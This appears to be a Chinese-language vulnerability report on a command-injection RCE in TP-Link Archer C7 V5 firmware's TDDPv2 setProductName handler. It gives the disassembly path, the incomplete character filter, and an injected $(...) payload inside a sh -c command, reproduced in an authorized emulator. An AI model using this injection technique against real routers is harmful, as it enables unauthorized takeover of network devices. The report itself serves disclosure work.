# 技术报告：TP-Link Archer C7 V5 TDDPv2 setProductName RCE

## 目标信息

目标固件：

```text
Archer C7(US)_V5.0_220715
c7v5_us-up-ver1-2-1-P1[20220715-rel19099]_2022-07-15_17.44.43
```

目标二进制：

```text
/usr/bin/tddp
sha256: 6ff6ff1fd2e05fa33854e8995906ac7f5df7c9e2612439bfd199948f61b308db
```

## 入口链路

TDDPv2 主处理逻辑进入 `spCmd` 后，根据数据包中的子命令字节分发。反汇编显示：

```text
0x404248: compare with 0x51
0x404250: compare with 0x52
0x40425c: jal 0x402f50
```

因此 `0x52` 会进入 `0x402f50` 附近的 `setProductName` 处理逻辑。

## 输入来源

在 `0x402f50` 处理函数中，程序根据状态从数据包偏移附近复制 product name：

```text
0x403010: read state byte
0x403018: a1 = 0xb027
0x40301c: a1 = 0xb037
0x403028: a1 = packet + selected offset
0x40302c: a2 = 0x40
0x403034: copy product name into stack buffer
```

这说明攻击者可控的 TDDPv2 payload 会进入 product name 处理流程。

## 过滤缺陷

函数随后循环检查 4 个非法字符。动态和静态分析确认过滤对象为：

```text
` | ; &
```

该过滤没有覆盖 shell command substitution 必需的 `$`、`(`、`)`，也没有正确处理单引号和命令模板组合。

## 命令执行点

product name 被拼接到 shell 命令模板中，并通过 `tddp_execCmd` 执行。动态 argv 证据如下：

```text
argv[0]=sh
argv[1]=-c
argv[2]=grep "product_name" /tmp/cc-tmp >/dev/null 2>&1 && sed -i 's/product_name:.*/product_name:A'$(echo TDDP_RCE>/tmp/pwned)'/g' /tmp/cc-tmp || echo "product_name:A'$(echo TDDP_RCE>/tmp/pwned)'" >> /tmp/cc-tmp
```

这证明注入 payload 位于 `/bin/sh -c` 的命令字符串中。

## 动态验证结果

本地授权仿真复现输出：

```text
sent=60 status=0x00
PWNED_CREATED
/tmp/pwned
TDDP_RCE
```

动态执行还记录到多次 `clone`/`waitpid`，对应目标程序执行外部命令的行为。

## 为什么这是 RCE

该漏洞不是单纯配置篡改。原因如下：

- 输入来自网络协议 payload。
- 输入进入 shell 命令字符串。
- payload 利用 shell command substitution 在命令解析阶段执行。
- side effect 文件 `/tmp/pwned` 由 shell 执行 payload 后产生。
- 原始 `/usr/bin/tddp` 的 SHA256 与固件内一致，未修改目标二进制。

## 当前证据边界

由于当前容器环境缺 MIPS `binfmt_misc`，QEMU user-mode 中目标程序内部再 `execve("/bin/sh", ...)` 会遇到环境问题。为复现完整 shell 语义，隔离 rootfs 中 `/bin/sh` 临时替换为 host-exec bridge。

该 bridge 的作用：

- 记录 shell argv。
- 调用 `qemu-mips-static -L / /bin/busybox sh ...`。
- 不直接创建 `/tmp/pwned`。

因此，bridge 不制造漏洞效果，只补齐仿真环境对子进程 shell 的执行能力。尽管如此，外部披露时仍建议补真机或完整系统 QEMU，避免审核方质疑动态环境。

